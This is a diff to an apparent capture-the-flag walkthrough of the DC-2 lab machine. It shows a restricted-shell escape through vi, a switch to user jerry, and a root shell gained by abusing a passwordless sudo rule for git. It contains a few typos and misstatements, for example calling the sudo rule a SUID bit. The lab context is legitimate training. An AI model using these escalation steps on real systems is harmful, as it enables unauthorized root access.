@@ -337,13 +337,67 @@ less  ls  scp  vi
 
 There is a way to escape restricted shell using the `vi` command.
 
-We can find the payload on GTFOBins.
+We can find the payload on [GTFOBins](https://gtfobins.github.io).
 
-![4](https://github.com/Kunull/Write-ups/assets/110326359/e9abd917-7915-4743-9b5e-f3712160e27d)
+![4](https://github.com/Kunull/Write-ups/assets/110326359/9af8dee2-32b0-47f0-9108-59b1b5cfedad)
+
+Because we want a Bash shell, we will have to modify the payload slightly.
+
+```
+vi
+:set shell=/bin/bash
+:shell
+```
+
+Let's execute the payload.
+
+```
+tom@DC-2:~$ vi
+
+tom@DC-2:~$
+```
+
+Now, let's export the `PATH` in the environment.
+
+```
+tom@DC-2:~$ export PATH=/bin:/usr/bin:$PATH
+tom@DC-2:~$ export SHELL=/bin/bash:$SHELL
+```
+
+### Switching to the jerry user
+
+We can switch to the user `jerry` using the `su` command.
+
+```
+tom@DC-2:~$ su jerry
+Password: 
+jerry@DC-2:/home/tom$ 
+```
 
 ### Privilege Escalation
 
-Now that we know that four commands are allowed, let's try to escalate privileges.
+Let's check what commands `jerry` can run with `root` privileges without needing a password.
 
-We can find the payload on GTFOBins.
+```
+jerry@DC-2:~$ sudo -l
+Matching Defaults entries for jerry on DC-2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
+User jerry may run the following commands on DC-2:
+    (root) NOPASSWD: /usr/bin/git
+```
+
+We can  use this misconfigured SUID bit to escalaet our privileges.
+
+We can find the this payload on [GTFOBins](https://gtfobins.github.io) as well.
+
+![3](https://github.com/Kunull/Write-ups/assets/110326359/de7e39b6-c6a4-4235-b7b6-3930c18fb997)
+
+If we use the second payload, we get a `root` shell.
+
+```
+root@DC-2:/home/jerry# whoami
+root
+```
+
+We are now the `root` user.
